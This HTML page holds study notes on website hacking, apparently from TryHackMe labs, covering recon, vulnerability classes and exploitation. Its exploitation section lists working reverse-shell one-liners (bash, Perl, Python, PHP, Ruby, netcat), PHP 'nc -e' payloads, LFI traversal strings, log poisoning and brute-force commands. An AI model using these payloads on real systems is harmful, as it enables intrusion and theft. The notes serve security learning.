<!DOCTYPE html>

<html>

<head>

  <meta charset="UTF-8">

  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>Website Hacking</title>

</head>

<body>

<h1 style="text-align: center;font-size:60px;">Website Hacking</h1>

              <!--  information gathering section start from here    -->

<br><br><h1 style="text-align: center;text-decoration: underline;">Information Gathering</h1>
<div>
<h2><li>Primary Information Gathering</li></h2> 
<p><b>Using browser ----</b>
  <ol>1. source view</ol> <ol>2. inspect<ol>Inspector</ol><ol>Debugger</ol><ol>Network</ol></ol> </p>
  <ol>3. get full source code - <a href="https://www.kali.org/tools/httrack/" target="_blank">httrack </a><br></ol>
<p><b>DNS Footprinting</b></p>

    <ol>whois (domain name/ip) -- <a href="https://whois.domaintools.com/" target="_blank">site 1</a>,<a href="https://www.netcraft.com/tools/" target="_blank">site 2</a>,<a href="https://www.robtex.com/" target="_blank">site 3</a></ol> 
    <ol>DNS info gathering tool -- <a href="https://dnsdumpster.com/" target="_blank">dns dumpster</a></ol>
    <ol>Check other site on the server -- <a href="https://www.robtex.com/" target="_blank">robtex</a> or bing:[IP]</ol>
    <ol> theHarvester - <a href="https://www.kali.org/tools/theharvester/" target="_blank">theHarvester </a></ol>
    <ol>hunter.io - <a href="https://hunter.io/" target="_blank">hunter.io</a></ol>
    <ol>whatweb - <a href="../tools/recon-tools/whatweb.html" >whatweb </a></ol>
    <ol>some kali tool usages articles
    <ol>nslookup - help source (<a href="https://www.geeksforgeeks.org/nslookup-command-in-linux-with-examples/amp/" target="_blank">source 1</a>,<a href="https://phoenixnap.com/kb/nslookup-command" target="_blank">source 2</a>)</ol>
    <ol> (domain) - dns info gathering tool -- <a href="https://www.cyberpratibha.com/enumerating-dns-records-through-dnsenum-tool-in-kali-linux/?amp=1" target="_blank">dnsenum</a></ol>
    </ol>
<b>Using -- <a href="https://www.maltego.com/" target="_blank">Maltego</a></b>
<p><b>Must gather these information</b></p>
<i>
  <ol>domains name = </ol>
  <ol>IP Address = </ol>
  <ol>Server name and version = </ol>
  <ol>Server side language = </ol>
  <ol>Server applications name and their version = </ol>
  <ol>Hosting provider = </ol>
  <ol>Nameservers = </ol>
  <ol>DNS records = </ol>
  <ol>Number of website on this server = </ol>
</i>
</div>

<div>
  <h2><li>Content Discovery</li></h2>
  <p><b>Manual Method</b></p> 
    <ol>Check robots.txt</ol>
    <ol>Check fevicon hash and compare with database to identify framework. favicon database link --<a href="https://wiki.owasp.org/index.php/OWASP_favicon_database" target="_blank"> https://wiki.owasp.org/index.php/OWASP_favicon_database</a>
    <ol><b>Discovering fevicon hash</b></ol>
      <ol>Linux --- curl [favicon.ico URL] | md5sum</ol>
      <ol>Windows powershell --- " curl [favicon.ico URL] -UseBasicParsing -o favicon.ico " and " Get-FileHash .\favicon.ico -Algorithm MD5 "</ol></ol>

    <ol>Check sitemap.xml file </ol>
    <ol>Check http response --- curl [URL] -v</ol>

    <ol>Using google dorks<ol>site --- site:tryhackme.com ---	returns results only from the specified website address</ol>
    <ol>inurl ---	inurl:admin ---	returns results that have the specified word in the URL</ol>
    <ol>filetype --- filetype:pdf ---	returns results which are a particular file extension</ol>
    <ol>intitle --- intitle:admin ---	returns results that contain the specified word in the title</ol></ol>

  <p><b>Automatated with tools</b></p>
        <ol><a href="https://www.wappalyzer.com/" target="_blank">wappalizer </a></ol>
        <ol>ffuf --- ffuf -w wordlist -u url/FUZZ</ol>
        <ol>gobuster --- gobuster dir --url [url] -w [wordlst]</ol>
        <ol>dirb ---- dirb url wordlist</ol>
    </div>

    <!--        subdomain finding section       -->
<div>
  <h2><li>Subdomain Enumeration / Subdomain Finding</li></h2>
  <p><b>Brute Force</b></p>
  <ol>ffuf tool: <ol>ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.100.232 </ol><ol> ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.100.232 -fs [size] --- replace size with 200 code size</ol></ol>
  <ol><a href="../tools/recon-tools/sublister.html" >sublist3r </a>: ./sublist3r.py -d example.com</ol>
  <ol>knock - <a href="https://github.com/guelfoweb/knock" target="_blank">knock</a></ol>
  <ol> (domain) - subdomain brute-forcing tool -- <a href="https://www.cyberpratibha.com/dnsmap-dns-domain-name-brute-forcing-tool/?amp=1" target="_blank"> dnsmap</a></ol>
  <p><b>OSINT</b></p>
  <ol>Open subdomain SSL log: <a href="https://crt.sh" target="_blank">https://crt.sh</a> and <a href="https://ui.ctsearch.entrust.com/ui/ctsearchui" target="_blank">https://ui.ctsearch.entrust.com/ui/ctsearchui</a></ol>
  <ol>Google dork: -site:www.tryhackme.com  site:*.tryhackme.com</ol>
  </div>
              <!--  information gathering section end here    -->



              <!--  Vulnerability Finding section start from here    -->

  <br><br><h1 style="text-align: center;text-decoration: underline;">Vulnerability Finding</h1>
  <div>
    <h2><li>Authentication Bypass</li></h2>
    <p><b>Brute Force</b></p>
    <ol>ffuf tool:
      <ol><b>username enumeration:</b> ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.240.195/customers/signup -mr "username already exists"<br>
      <b>Explaination:</b> the <b>-w </b> for wordlist. The <b>-X </b>for request method,GET request by default. The <b>-d </b>for data.In the ffuf tool, the FUZZ keyword signifies where the contents from our wordlist will be inserted in the request. The<b> -H </b> for additional headers.The <b>-u</b> for URL, the <b>-mr</b> for error message.</ol><br>
      <ol><b>Username & Password Brute-force: </b> ffuf -w [username_wordlist]:W1,[password_wordlist]:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u [login_url] -fc 200</ol>
    </ol>
    <p><b>Bypassing reset email vulnability</b></p>
    curl 'http://10.10.109.51/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={username}@customer.acmeitsupport.thm'
    
    <h2><li>IDOR vulnerabilities</li></h2>
    IDOR vulnerabilities: change url info (like http://online-service.thm/profile?user_id=1305, change id value) and see it vulnerable or not. url maybe encoded(base64) or hashed. if not found in url, check in network tab.
    
    <h2><li>Local File Inclusion (LFI)</li></h2>
     <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/dbf35cc4f35fde7a4327ad8b5a2ae2ec.png">
     <p>If website allow user to execute command in quary string after '=' sign, then this vulnerability happend.<br>Normally this cause happend for file_get_contents PHP fuction.</p>
     <p>If PHP 5.3.3 and down then NULLBYTE (%00 or 0x00) vulnerability will working.</p>
    
    <h2><li>Remote File Inclusion - RFI</li></h2>
    <p>Remote File Inclusion (RFI) is a technique to include remote files and into a vulnerable application. Like LFI, the RFI occurs when improperly sanitizing user input, allowing an attacker to inject an external URL into include function. <br>One requirement for RFI is that the allow_url_fopen option needs to be on.</p>
    <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b0c2659127d95a0b633e94bd00ed10e0.png" style="width:989.5px;height:611.368px">
  

     <h2><li>Remote code execution vulnerability</li></h2>
    <p>If website allow to execute code with their allow code like[their_code;attacker_code] then this vulnerability exist. <br>
    mixing code would be --- <b>[their_code;attacker_code]</b> or <b>[their_code ; attacker_code]</b> or <b>[their_code|attacker_code]</b> or <b>[their_code | attacker_code]</b> or <b>[their_code&&attacker_code]</b> or <b>[their_code && attacker_code]</b></p>

    <h2><li>File upload vulnerability</li></h2>
    <p> If website allow to upload any kind file like .php, .python then this vulnerability exist. <br>
    If they block other file upload, then intercept the request with burp suit, modifiy file name then forward it.<br>
    if they check file extension too.. then modifiy name with like this >>>> shell.php.jpg</p>
  
  </div>
            <!--  Vulnerability Finding section end here    -->




              <!--  Exploitation section start from here    -->
  <br><br><h1 style="text-align: center;text-decoration: underline;">Exploitation</h1>
  <div>
    <h2><li>File upload vulnerability exploit</li></h2>
    <b>Exploit file upload vulnerability using weevly:</b>
    <ol>Generate php shell >> weevely generate [password] [file_name]</ol>
    <ol>Connect with shell >> weevely [url to file] [password]</ol>

  <!--        Remote code execution exploit       -->
  <br><br>  <h2><li>Remote code execution [RCE] exploit</li></h2>
    <p>The following examples assums the hacker IP is 10.20.14 and use port 8080 for the connection.<br>
    in all f these cases you need to listen for port 8080 using the foolowing command: <b>nc -vv -l -p 8080</b>
<br><br>
<b>BASH</b><br>
bash -i >& /dev/tcp/10.20.14.203/8080 0>&1 <br><br>
<b>PERL</b><br>
perl -e 'use Socket;$i="10.20.14";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
<br><br>
<b>Python</b><br>
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.20.14",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
<br><br>
<b>PHP</b><br>
php -r '$sock=fsockopen("10.20.14",8080);exec("/bin/sh -i <&3 >&3 2>&3");'
<br><br>
<b>Ruby</b><br>
ruby -rsocket -e'f=TCPSocket.open("10.20.14",8080).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
<br><br>
<b>Netcat</b><br>
nc -e /bin/sh 10.20.14 8080<br>
    </p>

<br><br>
    <h2><li>Local File Inclusion (LFI) exploitation</li></h2>
    <p>Execute command in quary string</p>
    <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/dc22709e572d5de31ed4effb2ebc161f.png" style="width:1100.25px;height:513.67px">
     <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/3037513935e3242f74bd0fe97833b5ac.png"><br>
     <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/c12d34456ebe25bafffeb829c58f98c0.png" style="font-size:1rem;width:1000.25px;height:513.67px">
     <br>if the web application runs on a Windows server, the attacker needs to provide Windows paths. For example, if the attacker wants to read the boot.ini file located in c:\boot.ini, then the attacker can try the following depending on the target OS version:<br>
     <b>http://webapp.thm/get.php?file=../../../../boot.ini</b> or <b>http://webapp.thm/get.php?file=../../../../windows/win.ini</b>
     <br><br>
     <p>if <b>/etc/passwd</b> not work then try, <b>../../../../etc/passwd</b>. If it also didnot work then try, <b>with NULLBYTE(%00, 0x00) at the end of the payload.<br> example: http://webapp.thm/index.php?lang=/etc/passwd%00 or http://webapp.thm/index.php?lang=../../../../etc/passwd%00</b></p>
     <p> If none of them work then try <b>/etc/passwd/.</b> <br> if all of them are failed then oviously try this one - <b>....//....//....//....//....//etc/passwd</b></p>
     <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/30d3bf0341ba99485c5f683a416a056d.png" style="font-size:1rem;width:500.25px;height:200px">
    
    <h3>Getting shell from LFI exploit</h3>
    <p><b>Method 1: </b>
    <ol>Target >> /proc/self/environ<br><br>
     execute /proc/self/environ . read the file and chose an environ variable. then change it value with payload and forward it through burf suite. 
     <br> PHP payload >> <pre>  &lt;?passthru("nc -e /bin/sh [ip] [port]");?&gt;</pre></ol>
    <b>Method 2: </b>
    <ol>
    <br>Target >> /var/log/auth.log  or  /var/log/apache2/access.log<br>
    <p>try to connect with ssh. where payload use on username.<br>
    this time payload would encrypted like <pre> "&lt;?passthru(base64_decode('encrypted code'));?&gt;"</pre>
    </ol>
    <b>Tips: </b><i>some time it only work on url. it also some time work on specified folder. find it and execute payload there. If get request is broken, then sent payload with post request. always try this.
      <br>inject code POST. try to inject payload anywhere.
    </i>


    <h2><li>Remote File Inclusion (RFI) exploitation</li></h2>
    <p>Remote file inclusion same as LFI. sent payload url as input. <br>
    make php payload like ( <pre>  &lt;?passthru("nc -e /bin/sh [ip] [port]");?&gt;</pre>) or any kind of command and save it as a txt file.<br>
    Then give this file url as a payload with '?' at the end of the payload.<br><br>
    To execute command and see output use <pre> &lt;?php print exec('[cmd]');?&gt;</pre>
    </p>
</div>
   <!-- Exploitation section end here  -->
</body>
</html>           
